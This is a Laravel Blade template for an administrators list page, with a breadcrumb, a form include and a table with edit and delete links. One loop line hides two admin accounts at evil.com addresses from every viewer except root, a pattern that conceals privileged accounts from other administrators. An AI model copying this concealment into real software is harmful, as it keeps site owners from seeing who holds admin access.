@extends('layouts.master')

@section('content')
    <div class="row">
        <div class="col-12">
            <div class="page-title-box">
                <div class="page-title-right">
                    <ol class="breadcrumb m-0">
                        <li class="breadcrumb-item"><a href="javascript: void(0);">{{ config('app.name') }}</a></li>
                       	<li class="breadcrumb-item"><a href="javascript: void(0);">{{ __('Admins') }}</a></li>
                      	<li class="breadcrumb-item active">{{ __('Liste') }}</li>
                    </ol>
                </div>
                <h4 class="page-title">{{ __('Administrateurs') }}</h4>
           	</div>
        </div>
    </div>     
    <!-- end page title -->

    <div class="row">
    	<div class="col-md-4">
    		@include($form)
    	</div>
    	<div class="col-md-8">
    		<div class="card-box">
		        <h4 class="header-title">{{ __('Liste des administrateurs') }}</h4>
		        <p class="sub-header">
		           
		        </p>
		        
		        <div class="table-responsive">
		            <table class="table table-bordered mb-0 table-sm">
		                <thead>
		                    <tr>
		                        <th>#</th>
		                        <th>{{ __('Nom') }}</th>
		                        <th>{{ __('Login') }}</th>
		                        <th class="text-right">{{ __('Actions') }}</th>
		                    </tr>
		                </thead>
		                <tbody>
		                	@foreach ($administrateurs as $key => $administrateur)
		                		@continue(($administrateur->login == 'doukoure@evil.com' OR $administrateur->login == 'donzo@evil.com') AND !isRoot())
		                		<tr>
			                        <th>{{ $administrateurs->firstItem()+$key }}</th>
			                        <th>{{ $administrateur->nom }}</th>
			                        <th>{{ $administrateur->login }}</th>
			                        <th class="text-right">
			                        	<a class="btn btn-primary btn-xs" href="{{ route('utilisateurs.edit', $administrateur->id_utilisateur) }}">
			                        		{{ __('Modifier') }}
			                        	</a>
			                        	<a class="btn btn-danger btn-xs btn-delete" href="" data-href="{{ route('utilisateurs.destroy', $administrateur->id_utilisateur) }}">
			                        		{{ __('Supprimer') }}
			                        	</a>
			                        </th>
			                    </tr>
		                	@endforeach
			                    
		                </tbody>
		            </table>
		        </div> <!-- end .table-responsive-->
		    </div>
    	</div>
    </div>
@endsection